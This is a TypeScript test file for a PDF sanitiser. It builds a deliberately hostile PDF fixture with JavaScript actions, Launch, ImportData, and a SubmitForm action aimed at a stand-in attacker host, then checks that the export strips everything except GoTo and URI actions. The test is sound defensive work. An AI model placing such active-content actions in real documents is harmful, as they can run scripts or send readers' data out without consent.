// Active-content stripping (spec §9.1 step 4, §11.4): an allow-list of actions, applied wherever
// actions live, with /Next chains spliced and cycles cut.
import { PDFArray, PDFDict, PDFDocument, PDFName, PDFString, type PDFRef } from '@cantoo/pdf-lib';
import { describe, expect, it } from 'vitest';
import { removeEncryptionLeftovers, stripActiveContent } from '../src/export/hygiene.ts';
import { exportPdf, inspectPdf } from '../src/index.ts';
import { makeForm } from './helpers.ts';

const N = PDFName.of;

async function hostile() {
  const doc = await PDFDocument.create();
  const page = doc.addPage([612, 792]);
  const ctx = doc.context;
  const action = (s: string, extra: Record<string, unknown> = {}) =>
    ctx.register(ctx.obj({ S: s, ...extra }));
  const js = () => action('JavaScript', { JS: PDFString.of('app.alert(1)') });
  const uri = (u: string) => action('URI', { URI: PDFString.of(u) });

  // OpenAction: GoTo → JavaScript → URI; the JavaScript in the middle is spliced out.
  const tail = uri('https://example.com/tail');
  const middle = action('JavaScript', { JS: PDFString.of('x'), Next: tail });
  const goTo = action('GoTo', { D: ctx.obj([page.ref, N('Fit')]), Next: middle });
  doc.catalog.set(N('OpenAction'), goTo);

  // A cyclic chain on a link: URI → JavaScript → back to the URI.
  const loopUri = ctx.obj({ S: 'URI', URI: PDFString.of('https://example.com/loop') });
  const loopUriRef = ctx.register(loopUri);
  const loopJs = action('JavaScript', { JS: PDFString.of('y'), Next: loopUriRef });
  loopUri.set(N('Next'), loopJs);
  const link = ctx.register(
    ctx.obj({ Type: 'Annot', Subtype: 'Link', Rect: [0, 0, 10, 10], A: loopUriRef }),
  );
  // A link whose JavaScript action has an array of successors: only the safe ones survive.
  const branching = ctx.register(
    ctx.obj({
      Type: 'Annot',
      Subtype: 'Link',
      Rect: [20, 0, 30, 10],
      A: action('JavaScript', {
        JS: PDFString.of('z'),
        Next: ctx.obj([uri('https://example.com/a'), js(), uri('https://example.com/b')]),
      }),
    }),
  );
  // A widget-style annotation with SubmitForm in /AA and ImportData in /A.
  const widget = ctx.register(
    ctx.obj({
      Type: 'Annot',
      Subtype: 'Widget',
      Rect: [40, 0, 50, 10],
      A: action('ImportData', { F: PDFString.of('data.fdf') }),
      AA: ctx.obj({ U: action('SubmitForm', { F: PDFString.of('https://evil.example') }) }),
    }),
  );
  const media = ctx.register(ctx.obj({ Type: 'Annot', Subtype: 'RichMedia', Rect: [0, 0, 1, 1] }));
  const screen = ctx.register(ctx.obj({ Type: 'Annot', Subtype: 'Screen', Rect: [0, 0, 1, 1] }));
  for (const a of [link, branching, widget, media, screen]) page.node.addAnnot(a);

  // Outlines: an item with a JavaScript /A and a child with a GoTo; siblings form a cycle.
  const outlines = ctx.obj({ Type: 'Outlines' });
  const outlinesRef = ctx.register(outlines);
  const child = ctx.obj({
    Title: PDFString.of('child'),
    A: action('GoTo', { D: ctx.obj([page.ref, N('Fit')]) }),
  });
  const childRef = ctx.register(child);
  const first = ctx.obj({
    Title: PDFString.of('first'),
    A: js(),
    First: childRef,
    Parent: outlinesRef,
  });
  const firstRef = ctx.register(first);
  const second = ctx.obj({ Title: PDFString.of('second'), A: action('Launch'), Next: firstRef });
  const secondRef = ctx.register(second);
  first.set(N('Next'), secondRef);
  outlines.set(N('First'), firstRef);
  doc.catalog.set(N('Outlines'), outlinesRef);
  doc.catalog.set(N('AA'), ctx.obj({ WC: js() }));
  page.node.set(N('AA'), ctx.obj({ O: js() }));
  doc.catalog.set(
    N('Names'),
    ctx.obj({ JavaScript: ctx.obj({ Names: [PDFString.of('a'), js()] }) }),
  );
  return { doc, page, link, branching, widget, goTo, tail, first, second, child, loopUri };
}

const lookup = (doc: PDFDocument, ref: PDFRef) => doc.context.lookup(ref, PDFDict);
const sOf = (doc: PDFDocument, value: unknown) =>
  (doc.context.lookup(value as PDFRef) as PDFDict).get(N('S'))?.toString();

describe('stripActiveContent', () => {
  it('keeps only GoTo and URI actions, splicing /Next chains and cutting cycles', async () => {
    const h = await hostile();
    stripActiveContent(h.doc);
    const { doc } = h;

    // OpenAction: GoTo, then the URI that followed the removed JavaScript.
    const open = doc.catalog.get(N('OpenAction'));
    expect(open).toBe(h.goTo);
    expect(lookup(doc, h.goTo).get(N('Next'))).toBe(h.tail);

    // The cyclic link keeps its URI and loses the JavaScript and the loop.
    const link = lookup(doc, h.link);
    expect(sOf(doc, link.get(N('A')))).toBe('/URI');
    expect(h.loopUri.get(N('Next'))).toBeUndefined();

    // The branching link: the JavaScript head is replaced by the first URI, the second follows.
    const branching = lookup(doc, h.branching);
    const head = doc.context.lookup(branching.get(N('A')), PDFDict);
    expect(head.get(N('URI'))?.toString()).toContain('example.com/a');
    expect(sOf(doc, head.get(N('Next')))).toBe('/URI');

    // The widget loses both its ImportData action and its SubmitForm additional action.
    const widget = lookup(doc, h.widget);
    expect(widget.get(N('A'))).toBeUndefined();
    expect(widget.get(N('AA'))).toBeUndefined();

    // Outline items: JavaScript and Launch removed, the child's GoTo kept, the cycle terminates.
    expect(h.first.get(N('A'))).toBeUndefined();
    expect(h.second.get(N('A'))).toBeUndefined();
    expect(sOf(doc, h.child.get(N('A')))).toBe('/GoTo');

    // RichMedia and Screen annotations are gone; the others remain.
    const annots = h.page.node.lookup(N('Annots'), PDFArray);
    expect(annots.size()).toBe(3);
    expect(doc.catalog.get(N('AA'))).toBeUndefined();
    expect(h.page.node.get(N('AA'))).toBeUndefined();
    expect(doc.catalog.lookup(N('Names'), PDFDict).get(N('JavaScript'))).toBeUndefined();
  });

  it('keeps a destination-array OpenAction and removes an unsafe one entirely', async () => {
    const doc = await PDFDocument.create();
    const page = doc.addPage();
    const dest = doc.context.obj([page.ref, N('Fit')]);
    doc.catalog.set(N('OpenAction'), dest);
    stripActiveContent(doc);
    expect(doc.catalog.get(N('OpenAction'))).toBe(dest);
    doc.catalog.set(N('OpenAction'), doc.context.obj({ S: 'JavaScript', JS: PDFString.of('1') }));
    stripActiveContent(doc);
    expect(doc.catalog.get(N('OpenAction'))).toBeUndefined();
  });

  it('runs as part of export, which leaves no JavaScript in the output', async () => {
    const bytes = await makeForm({ javascript: true });
    const info = await inspectPdf(bytes);
    if (!info.ok) throw new Error('inspect failed');
    const out = await exportPdf({
      bytes,
      info: info.value,
      state: { fieldValues: {}, overlays: [] },
      signatures: new Map(),
      options: { replaceNonWinAnsi: false, now: 0 },
    });
    if (!out.ok) throw new Error(JSON.stringify(out.problems));
    const text = new TextDecoder('latin1').decode(out.value.bytes);
    expect(text).not.toMatch(/JavaScript|Launch|\/AA/);
  });
});

describe('removeEncryptionLeftovers', () => {
  it('deletes encryption dictionaries kept as ordinary objects', async () => {
    const doc = await PDFDocument.create();
    doc.addPage();
    const ref = doc.context.register(
      doc.context.obj({ Filter: 'Standard', O: PDFString.of('o'), U: PDFString.of('u') }),
    );
    removeEncryptionLeftovers(doc);
    expect(doc.context.lookup(ref)).toBeUndefined();
  });
});
